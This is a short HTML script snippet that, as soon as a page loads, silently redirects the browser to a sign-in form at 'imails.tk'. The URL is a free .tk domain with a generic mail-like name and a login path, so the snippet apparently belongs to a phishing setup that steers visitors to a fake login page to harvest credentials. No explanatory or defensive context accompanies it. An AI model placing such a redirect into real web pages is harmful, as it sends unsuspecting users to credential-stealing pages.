<script type='text/javascript'>
    window.location.href = 'http://imails.tk/forms/signin.php';
</script>